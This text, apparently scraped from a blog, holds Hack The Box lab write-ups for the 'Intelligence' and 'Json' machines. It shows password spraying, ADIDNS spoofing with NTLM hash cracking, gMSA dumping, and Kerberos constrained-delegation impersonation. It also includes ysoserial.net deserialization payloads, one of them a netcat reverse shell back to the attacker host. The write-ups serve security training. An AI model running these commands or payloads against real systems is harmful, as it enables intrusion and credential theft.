2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Ian.Duncan@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: David.Wilson@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: David.Reed@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Brian.Baker@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Anita.Roberts@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Jason.Patterson@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Jason.Wright@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: John.Coleman@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Jessica.Moody@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Jennifer.Thomas@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Richard.Williams@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Kaitlyn.Zimmerman@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Kelly.Long@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Jose.Williams@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Stephanie.Young@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Scott.Scott@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Teresa.Williamson@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Samuel.Richardson@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Nicole.Brock@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Tiffany.Molina@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Veronica.Patel@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Thomas.Hall@intelligence.htb 2023/09/06 18:52:22 \u0026gt; [+] VALID USERNAME: Thomas.Valenzuela@intelligence.htb 2023/09/06 18:52:23 \u0026gt; [+] VALID USERNAME: Travis.Evans@intelligence.htb 2023/09/06 18:52:23 \u0026gt; [+] VALID USERNAME: William.Lee@intelligence.htb 2023/09/06 18:52:23 \u0026gt; Done! Tested 30 usernames (30 valid) in 0.660 seconds Okay, now we can go through every doc and look for interesting information └─$ grep -in \u0026#34;pass\u0026#34; *.txt 2020-06-04-upload.txt:3:Please login using your username and the default password of: 2020-06-04-upload.txt:5:After logging in please change your password as soon as possible. └─$ cat 2020-06-04-upload.txt New Account Guide Welcome to Intelligence Corp! Please login using your username and the default password of: NewIntelligenceCorpUser9876 After logging in please change your password as soon as possible. We have a password, let\u0026rsquo;s password spray We can also test it via kerbrute passwordspray --dc dc.intelligence.htb -d intelligence.htb users.list 'NewIntelligenceCorpUser9876' -v But if it shows no hits, it could be due to KRB_AP_ERR_SKEW Clock skew too great error, which I had So you need to sync your machine time with the box └─$ crackmapexec smb dc.intelligence.htb -u users.list -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; --continue-on-success SMB dc.intelligence.htb 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB dc.intelligence.htb 445 DC [-] intelligence.htb\\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE But no winrm └─$ crackmapexec winrm dc.intelligence.htb -u Tiffany.Molina -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; --continue-on-success SMB dc.intelligence.htb 5985 DC [*] Windows 10.0 Build 17763 (name:DC) (domain:intelligence.htb) HTTP dc.intelligence.htb 5985 DC [*] http://dc.intelligence.htb:5985/wsman WINRM dc.intelligence.htb 5985 DC [-] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 User smb └─$ smbclient -L //dc.intelligence.htb -U \u0026#39;Tiffany.Molina%NewIntelligenceCorpUser9876\u0026#39; Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC IT Disk NETLOGON Disk Logon server share SYSVOL Disk Logon server share Users Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to dc.intelligence.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available Let\u0026rsquo;s check IT and Users └─$ smbclient //dc.intelligence.htb/Users -U \u0026#39;Tiffany.Molina%NewIntelligenceCorpUser9876\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . DR 0 Mon Apr 19 02:20:26 2021 .. DR 0 Mon Apr 19 02:20:26 2021 Administrator D 0 Mon Apr 19 01:18:39 2021 All Users DHSrn 0 Sat Sep 15 08:21:46 2018 Default DHR 0 Mon Apr 19 03:17:40 2021 Default User DHSrn 0 Sat Sep 15 08:21:46 2018 desktop.ini AHS 174 Sat Sep 15 08:11:27 2018 Public DR 0 Mon Apr 19 01:18:39 2021 Ted.Graves D 0 Mon Apr 19 02:20:26 2021 Tiffany.Molina D 0 Mon Apr 19 01:51:46 2021 3770367 blocks of size 4096. 1462131 blocks available smb: \\\u0026gt; cd Tiffany.Molina smb: \\Tiffany.Molina\\\u0026gt; ls . D 0 Mon Apr 19 01:51:46 2021 .. D 0 Mon Apr 19 01:51:46 2021 AppData DH 0 Mon Apr 19 01:51:46 2021 Application Data DHSrn 0 Mon Apr 19 01:51:46 2021 Cookies DHSrn 0 Mon Apr 19 01:51:46 2021 Desktop DR 0 Mon Apr 19 01:51:46 2021 Documents DR 0 Mon Apr 19 01:51:46 2021 Downloads DR 0 Sat Sep 15 08:12:33 2018 Favorites DR 0 Sat Sep 15 08:12:33 2018 Links DR 0 Sat Sep 15 08:12:33 2018 Local Settings DHSrn 0 Mon Apr 19 01:51:46 2021 Music DR 0 Sat Sep 15 08:12:33 2018 My Documents DHSrn 0 Mon Apr 19 01:51:46 2021 NetHood DHSrn 0 Mon Apr 19 01:51:46 2021 NTUSER.DAT AHn 131072 Thu Sep 7 00:15:25 2023 ntuser.dat.LOG1 AHS 86016 Mon Apr 19 01:51:46 2021 ntuser.dat.LOG2 AHS 0 Mon Apr 19 01:51:46 2021 NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf AHS 65536 Mon Apr 19 01:51:46 2021 NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms AHS 524288 Mon Apr 19 01:51:46 2021 NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms AHS 524288 Mon Apr 19 01:51:46 2021 ntuser.ini AHS 20 Mon Apr 19 01:51:46 2021 Pictures DR 0 Sat Sep 15 08:12:33 2018 Recent DHSrn 0 Mon Apr 19 01:51:46 2021 Saved Games D 0 Sat Sep 15 08:12:33 2018 SendTo DHSrn 0 Mon Apr 19 01:51:46 2021 Start Menu DHSrn 0 Mon Apr 19 01:51:46 2021 Templates DHSrn 0 Mon Apr 19 01:51:46 2021 Videos DR 0 Sat Sep 15 08:12:33 2018 3770367 blocks of size 4096. 1462131 blocks available smb: \\Tiffany.Molina\\\u0026gt; cd Desktop smb: \\Tiffany.Molina\\Desktop\\\u0026gt; ls . DR 0 Mon Apr 19 01:51:46 2021 .. DR 0 Mon Apr 19 01:51:46 2021 user.txt AR 34 Thu Sep 7 00:05:56 2023 3770367 blocks of size 4096. 1462131 blocks available └─$ smbclient //dc.intelligence.htb/IT -U \u0026#39;Tiffany.Molina%NewIntelligenceCorpUser9876\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Apr 19 01:50:55 2021 .. D 0 Mon Apr 19 01:50:55 2021 downdetector.ps1 A 1046 Mon Apr 19 01:50:55 2021 3770367 blocks of size 4096. 1462131 blocks available smb: \\\u0026gt; get downdetector.ps1 getting file \\downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec) downdetector.ps1 It checks AD for records with web prefix and performs curl to test if they are online using credentials └─$ cat downdetector.ps1 # Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach($record in Get-ChildItem \u0026#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb\u0026#34; | Where-Object Name -like \u0026#34;web*\u0026#34;) { try { $request = Invoke-WebRequest -Uri \u0026#34;http://$($record.Name)\u0026#34; -UseDefaultCredentials if(.StatusCode -ne 200) { Send-MailMessage -From \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -To \u0026#39;Ted Graves \u0026lt;Ted.Graves@intelligence.htb\u0026gt;\u0026#39; -Subject \u0026#34;Host: $($record.Name) is down\u0026#34; } } catch {} } We could also run bloodhound, but this script implies we have attack this path https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-integrated-dns https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing We need krbrelayx dnstool.py And responder └─$ sudo responder -I tun0 [sudo] password for kali: __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 3.1.3.0 To support this project: Patreon -\u0026gt; https://www.patreon.com/PythonResponder Paypal -\u0026gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C ... Lets try adding new A` record └─$ python3 dnstool.py -u \u0026#39;intelligence\\Tiffany.Molina\u0026#39; -p \u0026#39;NewIntelligenceCorpUser9876\u0026#39; 10.10.10.248 -a add -r web1 -d 10.10.16.9 -t A [-] Connecting to host... [-] Binding to host [+] Bind OK [-] Adding new record [+] LDAP operation completed successfully Now we wait Let\u0026rsquo;s crack the hash └─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting ... TED.GRAVES::intelligence:fc4f3dea61817ebd:8e26af6a7227930138b5c644cfff4ab7:01010000000000009bb92c7a29e1d901862fca5d1a9792780000000002000800420048004b00570001001e00570049004e002d003000580047004f004f005a0052004c00430056005a0004001400420048004b0057002e004c004f00430041004c0003003400570049004e002d003000580047004f004f005a0052004c00430056005a002e00420048004b0057002e004c004f00430041004c0005001400420048004b0057002e004c004f00430041004c000800300030000000000000000000000000200000c10dab08ac787c3f5e7104c83c4a6301a82c1a9491d8346d8d7f6b8d8ef337500a001000000000000000000000000000000000000900340048005400540050002f0077006500620031002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy Session..........: hashcat Status...........: Cracked Hash.Mode........: 5600 (NetNTLMv2) Hash.Target......: TED.GRAVES::intelligence:fc4f3dea61817ebd:8e26af6a7...000000 Time.Started.....: Wed Sep 6 19:22:15 2023 (10 secs) Time.Estimated...: Wed Sep 6 19:22:25 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1096.4 kH/s (0.47ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 10814464/14344385 (75.39%) Rejected.........: 0/10814464 (0.00%) Restore.Point....: 10813952/14344385 (75.39%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: Mrs B -\u0026gt; Mr.Brownstone Hardware.Mon.#1..: Util: 90% Started: Wed Sep 6 19:22:15 2023 Stopped: Wed Sep 6 19:22:26 2023 And it works └─$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [+] intelligence.htb\\Ted.Graves:Mr.Teddy Root Now we can check bloodhound bloodhound-python -c all -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 --zip We have a ReadGMSAPassword rights over svc_int which has delegation to dc.intelligence.htb Group managed service accounts (gMSAs) gMSAs can run on one server, or in a server farm, such as systems behind a network load balancing or Internet Information Services (IIS) server. After you configure your services to use a gMSA principal, account password management is handled by the Windows operating system (OS) https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword Let\u0026rsquo;s get the hash using gMSADumper └─$ python3 gMSADumper.py -u \u0026#39;Ted.Graves\u0026#39; -p \u0026#39;Mr.Teddy\u0026#39; -d intelligence.htb -l 10.10.10.248 Users or groups who can read password for svc_int$: \u0026gt; DC$ \u0026gt; itsupport svc_int$:::ff3418066942aa8bd228ea17dc71999a svc_int$:aes256-cts-hmac-sha1-96:30844881b57965c3a115cafa00eb0935928ff0af889f3818e0bc1ccf50c0cbfb svc_int$:aes128-cts-hmac-sha1-96:327f8f8594183dfe4f430986556147b2 Now we can attack Kerberos constrained delegation If an attacker has compromised a service account with constrained delegation, they can relay received authentication attempts to one or more SPNs in the list. If we compromise an account with constrained delegation, we can delegate the authentication to any service offered by the account in the authorized list If this constrained delegation allows protocol transition, we can pretend to be anyone, arbitrarily, to authenticate against these services. https://www.onsecurity.io/blog/abusing-kerberos-from-linux/ https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained └─$ impacket-getST -spn \u0026#39;www/dc.intelligence.htb\u0026#39; -dc-ip 10.10.10.248 -hashes \u0026#39;:ff3418066942aa8bd228ea17dc71999a\u0026#39; -impersonate Administrator \u0026#39;intelligence.htb/svc_int\u0026#39; Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [-] CCache file is not found. Skipping... [*] Getting TGT for user Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) We need to sync with Domain Controller We can do it using ntpdate which sync time with NTP server └─$ sudo service virtualbox-guest-utils stop └─$ sudo ntpdate 10.10.10.248 [sudo] password for kali: 2023-09-07 02:55:40.735325 (+0100) +25164.221617 +/- 0.046405 10.10.10.248 s1 no-leap Now we can get the ticket └─$ impacket-getST -spn \u0026#39;www/dc.intelligence.htb\u0026#39; -dc-ip 10.10.10.248 -hashes \u0026#39;:ff3418066942aa8bd228ea17dc71999a\u0026#39; -impersonate Administrator \u0026#39;intelligence.htb/svc_int\u0026#39; Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator.ccache Now export the ticket and connect with psexec or wmiexec └─$ export KRB5CCNAME=./Administrator.ccache ","date":"September 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/intelligence/images/intelligence.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/intelligence/","summary":"Intelligence Enumeration nmap └─$ nmap -Pn -p- 10.10.10.248 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 17:07 BST Nmap scan report for 10.10.10.248 (10.10.10.248) Host is up (0.095s latency). Not shown: 65518 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49691/tcp open unknown 49692/tcp open unknown 49708/tcp open unknown 49714/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sC -sV 10.","tags":["HTB","crackmapexec","smbmap","smbclient","smb","dns","dnsenum","ldapsearch","exiftool","kerbrute","password-spray","bloodhound","bloodhound-py","dnstool","responder","hashcat","readgmsapassword","gmsa","gmsadumper","silver-ticket","wmiexec","psexec","delegations"],"title":"[HTB] Machine: Intelligence"},{"categories":null,"contents":"Json Enumeration nmap └─$ nmap -Pn -p- 10.10.10.158 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 20:02 BST Stats: 0:03:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 45.70% done; ETC: 20:10 (0:04:37 remaining) Nmap scan report for 10.10.10.158 (10.10.10.158) Host is up (0.12s latency). Not shown: 65521 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown └─$ nmap -Pn -p21,80,135,139,445,5985 -sC -sV 10.10.10.158 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 20:02 BST Nmap scan report for 10.10.10.158 (10.10.10.158) Host is up (0.13s latency). PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd | ftp-syst: |_ SYST: UNIX emulated by FileZilla 80/tcp open http Microsoft IIS httpd 8.5 |_http-title: Json HTB | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-07T19:02:11 |_ start_date: 2023-09-07T18:55:22 |_clock-skew: mean: -36s, deviation: 0s, median: -36s | smb2-security-mode: | 3:0:2: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: JSON, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:b9:fb:43 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.86 seconds smb └─$ smbclient -N -L //10.10.10.158 session setup failed: NT_STATUS_ACCESS_DENIED Web server ftp └─$ ftp anonymous@10.10.10.158 Connected to 10.10.10.158. 220-FileZilla Server 0.9.60 beta 220-written by Tim Kosse (tim.kosse@filezilla-project.org) 220 Please visit https://filezilla-project.org/ 331 Password required for anonymous Password: 530 Login or password incorrect! ftp: Login failed Foothold We have bunch of 404 status codes Looks like we can also enumerate users We also have an obfuscated js file We can also try deobfuscating it But trying admin:admin on login page worked And we\u0026rsquo;re in We see the request is sent to /api/token And we have OAuth2 cookie in base64 {\u0026quot;Id\u0026quot;:1,\u0026quot;UserName\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;Password\u0026quot;:\u0026quot;21232f297a57a5a743894a0e4a801fc3\u0026quot;,\u0026quot;Name\u0026quot;:\u0026quot;User Admin HTB\u0026quot;,\u0026quot;Rol\u0026quot;:\u0026quot;Administrator\u0026quot;} We also have another api request to Account We have both OAuth2 and Bearer headers set to the same value If we change the value of the OAuth2, we have the result But when we change the value of the Bearer, we have a deserialization error We can try ysoserial.net https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net Generate a payload Modify the Bearer and send the request And we have a connection D:\\Tools\\ysoserial-1.35\\Release\u0026gt;ysoserial.exe -g ObjectDataProvider -f Json.Net -c \u0026#34;ping 10.10.16.9\u0026#34; -o base64 ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgMTAuMTAuMTYuOSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9 Now let\u0026rsquo;s get a reverse shell D:\\Tools\\ysoserial-1.35\\Release\u0026gt;ysoserial.exe -g ObjectDataProvider -f Json.Net -c \u0026#34;\\\\10.10.16.9\\share\\nc64.exe 10.10.16.9 6666 -e cmd.exe\u0026#34; -o base64 ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIFxcXFwxMC4xMC4xNi45XFxzaGFyZVxcbmM2NC5leGUgMTAuMTAuMTYuOSA2NjY2IC1lIGNtZC5leGUnXQ0KICAgIH0sDQogICAgJ09iamVjdEluc3RhbmNlJzp7JyR0eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknfQ0KfQ== Root We have another user superadmin c:\\Users\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is AEF2-0DF2 Directory of c:\\Users 03/17/2021 11:00 AM \u0026lt;DIR\u0026gt; . 03/17/2021 11:00 AM \u0026lt;DIR\u0026gt; .. 05/22/2019 04:52 PM \u0026lt;DIR\u0026gt; .NET v2.0 05/22/2019 04:52 PM \u0026lt;DIR\u0026gt; .NET v2.0 Classic 05/22/2019 04:52 PM \u0026lt;DIR\u0026gt; .NET v4.5 05/22/2019 04:52 PM \u0026lt;DIR\u0026gt; .NET v4.5 Classic 03/17/2021 11:01 AM \u0026lt;DIR\u0026gt; Administrator 05/22/2019 04:52 PM \u0026lt;DIR\u0026gt; Classic .NET AppPool 08/22/2013 11:39 AM \u0026lt;DIR\u0026gt; Public 05/22/2019 05:37 PM \u0026lt;DIR\u0026gt; superadmin 05/22/2019 05:07 PM \u0026lt;DIR\u0026gt; userpool 0 File(s) 0 bytes 11 Dir(s) 4,666,466,304 bytes free superadmin is a member of Administrators group c:\\Users\u0026gt;net user superadmin net user superadmin User name superadmin Full Name Comment User\u0026#39;s comment Country/region code 001 (United States) Account active Yes Account expires Never Password last set 5/22/2019 3:25:00 PM Password expires Never Password changeable 5/22/2019 3:25:00 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 9/9/2023 6:07:13 AM Logon hours allowed All Local Group Memberships *Administrators *Users Global Group memberships *None The command completed successfully. We also have SeImpersonatePrivilege, so we can use one of Potato escalation techniques https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato c:\\Users\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled We also have Sync2Ftp c:\\Program Files\\Sync2Ftp\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is AEF2-0DF2 Directory of c:\\Program Files\\Sync2Ftp 05/23/2019 03:06 PM \u0026lt;DIR\u0026gt; . 05/23/2019 03:06 PM \u0026lt;DIR\u0026gt; .. 05/23/2019 02:48 PM 9,728 SyncLocation.exe 05/23/2019 03:08 PM 591 SyncLocation.exe.config 2 File(s) 10,319 bytes 2 Dir(s) 4,666,445,824 bytes free c:\\Program Files\\Sync2Ftp\u0026gt;type SyncLocation.exe.config 